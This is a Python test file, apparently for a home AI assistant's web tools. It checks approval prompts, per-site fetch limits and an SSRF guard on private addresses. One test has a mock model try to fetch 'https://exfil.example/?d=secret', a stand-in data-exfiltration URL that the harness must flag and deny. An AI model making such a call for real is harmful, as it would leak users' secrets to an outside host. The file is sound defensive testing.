"""Internet tools end to end: offered only where allowed, results from the owner's SearXNG, and an
approval before contacting any address that neither the user nor a web result supplied."""

import asyncio
import json

import pytest

from harness import Harness
from homemesh.tools import webfetch
from httpstub import Server

pytestmark = pytest.mark.slow

SEARX = {"results": [{"url": "https://recipes.example/pancakes", "title": "Pancakes", "content": "Fluffy",
                      "engine": "duckduckgo"}], "answers": [], "infoboxes": [], "suggestions": [],
         "unresponsive_engines": []}


@pytest.fixture
async def h(tmp_path):
    harness = Harness(tmp_path)
    await harness.start(roles=["coordinator"])
    await harness.owner_client()
    yield harness
    await harness.stop()


@pytest.fixture
def private_dns(monkeypatch):
    """Every name resolves to a home-network address, so no test ever reaches the internet and
    fetch_url must refuse to connect."""
    async def resolve(host, port):
        return ["192.168.1.10"]

    monkeypatch.setattr(webfetch, "system_resolver", resolve)


async def _chat(c, conv_id, content, decide=None):
    events = []

    async def run():
        async with c.stream("POST", f"/api/v1/conversations/{conv_id}/messages", json={"content": content}) as r:
            assert r.status_code == 200
            ev = None
            async for line in r.aiter_lines():
                if line.startswith("event:"):
                    ev = line[6:].strip()
                elif line.startswith("data:"):
                    data = json.loads(line[5:])
                    events.append((ev, data))
                    if ev == "approval_required" and decide is not None:
                        resp = await c.post(f"/api/v1/tools/approvals/{data['approval_id']}", json={"approved": decide})
                        assert resp.status_code == 200

    await asyncio.wait_for(run(), 30)
    return events


def _call(tool, args):
    # JSON escapes keep the address out of the user's own text (the mock model still reads it),
    # so the coordinator sees a link the user did not type.
    raw = json.dumps(args).replace("/", "\\/").replace(".", "\\u002e")
    return f"[[mock:tool:{tool} {raw}]]"


async def test_web_tools_are_offered_only_where_allowed(h):
    await h.add_worker("hub", models={"mock-chat": ["completion", "tools"]})
    c = h.client
    conv = (await c.post("/api/v1/conversations", json={})).json()
    events = await _chat(c, conv["id"], "hello")
    offered = dict(events)["context"]["tools_offered"]
    assert not {"web_search", "fetch_url", "open_url"} & set(offered)
    tools = {t["name"]: t for t in (await c.get("/api/v1/tools")).json()}
    assert tools["open_url"]["requires_approval"] and not tools["web_search"]["available_on"]


async def test_fetching_an_address_nobody_supplied_needs_approval(h, private_dns):
    await h.add_worker("bazzite", models={"mock-chat": ["completion", "tools"]}, allowed_tools=["fetch_url"])
    c = h.client
    conv = (await c.post("/api/v1/conversations", json={})).json()
    events = await _chat(c, conv["id"], _call("fetch_url", {"url": "https://exfil.example/?d=secret"}), decide=False)
    approval = dict(events)["approval_required"]
    assert approval["tool"] == "fetch_url" and approval["node_name"] == "bazzite"
    assert "did not come from you" in approval["reason"]
    assert approval["arguments"]["url"] == "https://exfil.example/?d=secret"
    res = dict(events)["tool_result"]
    assert res["ok"] is False and "denied" in res["result"]["error"]


async def test_links_from_the_user_or_a_search_result_are_fetched_without_asking(h, private_dns):
    async with Server({"/search": (200, {"Content-Type": "application/json"}, json.dumps(SEARX).encode())}) as searx:
        await h.add_worker("bazzite", models={"mock-chat": ["completion", "tools"]},
                           allowed_tools=["web_search", "fetch_url"],
                           web={"searxng_url": f"http://127.0.0.1:{searx.port}"})
        c = h.client
        conv = (await c.post("/api/v1/conversations", json={})).json()
        # 1. The user typed the link.
        events = await _chat(c, conv["id"], "Summarise docs.example/guide please "
                                            '[[mock:tool:fetch_url {"url": "https://docs.example/guide"}]]')
        kinds = [e for e, _ in events]
        assert "approval_required" not in kinds
        res = dict(events)["tool_result"]["result"]
        # It ran on the worker, whose SSRF guard refused the (fake) home-network address.
        assert res["ok"] is False and "private or local network" in res["error"] and res["node"] == "bazzite"
        # 2. A search result supplied the link.
        events = await _chat(c, conv["id"], _call("web_search", {"query": "pancakes"}))
        found = dict(events)["tool_result"]["result"]
        assert found["ok"] and found["output"]["results"][0]["url"] == "https://recipes.example/pancakes"
        assert "format=json" in searx.requests[-1]["target"]
        events = await _chat(c, conv["id"], _call("fetch_url", {"url": "https://recipes.example/pancakes"}))
        assert "approval_required" not in [e for e, _ in events]
        # 3. ...but the same site with extra data appended is a new address and needs approval.
        events = await _chat(c, conv["id"], _call("fetch_url", {"url": "https://recipes.example/pancakes?x=1"}),
                             decide=False)
        assert "approval_required" in [e for e, _ in events]


async def test_open_url_always_asks_and_names_the_computer(h, monkeypatch):
    from homemesh.tools.builtin import web

    opened = []

    async def fake_open(url):
        opened.append(url)
        return "test browser"

    monkeypatch.setattr(web, "open_in_browser", fake_open)
    await h.add_worker("hub", models={"mock-chat": ["completion", "tools"]}, allowed_tools=["open_url"])
    c = h.client
    conv = (await c.post("/api/v1/conversations", json={})).json()
    # Even a link the user typed needs the Approve click.
    events = await _chat(c, conv["id"], 'open youtube.com [[mock:tool:open_url {"url": "https://www.YouTube.com"}]]',
                         decide=True)
    approval = dict(events)["approval_required"]
    assert approval["node_name"] == "hub" and approval["arguments"] == {"url": "https://www.youtube.com/"}
    assert dict(events)["tool_result"]["ok"] is True and opened == ["https://www.youtube.com/"]
    events = await _chat(c, conv["id"], '[[mock:tool:open_url {"url": "http://192.168.1.1/"}]]', decide=False)
    assert "your own network" in dict(events)["approval_required"]["note"]
    assert opened == ["https://www.youtube.com/"]


async def test_search_results_are_read_without_asking_only_a_few_per_answer_and_one_per_site(h, private_dns):
    results = [{"url": u, "title": u, "content": "", "engine": "x"} for u in (
        "https://a.example/1", "https://b.example/1", "https://c.example/1", "https://d.example/1",
        "https://a.example/2")]
    searx_json = {**SEARX, "results": results}
    async with Server({"/search": (200, {"Content-Type": "application/json"}, json.dumps(searx_json).encode())}) as sx:
        await h.add_worker("bazzite", models={"mock-chat": ["completion", "tools"]},
                           allowed_tools=["web_search", "fetch_url"],
                           web={"searxng_url": f"http://127.0.0.1:{sx.port}"})
        c = h.client
        conv = (await c.post("/api/v1/conversations", json={})).json()
        await _chat(c, conv["id"], _call("web_search", {"query": "x"}))
        four = "".join(_call("fetch_url", {"url": u}) for u in (
            "https://a.example/1", "https://b.example/1", "https://c.example/1", "https://d.example/1"))
        events = await _chat(c, conv["id"], four, decide=False)
        asked = [d["arguments"]["url"] for e, d in events if e == "approval_required"]
        assert asked == ["https://d.example/1"]  # three sites without asking, the fourth asks
        assert "already read 3 pages" in next(d for e, d in events if e == "approval_required")["reason"]
        same_site = _call("fetch_url", {"url": "https://a.example/1"}) + _call("fetch_url", {"url": "https://a.example/2"})
        events = await _chat(c, conv["id"], same_site, decide=False)
        asked = [d for e, d in events if e == "approval_required"]
        assert [d["arguments"]["url"] for d in asked] == ["https://a.example/2"] and "this site" in asked[0]["reason"]
        # The approval list (Jobs page, other devices) shows the same details as the chat card.
        pending = (await c.get("/api/v1/tools/approvals")).json()
        assert any((a.get("details_json") or {}).get("node_name") == "bazzite" for a in pending)
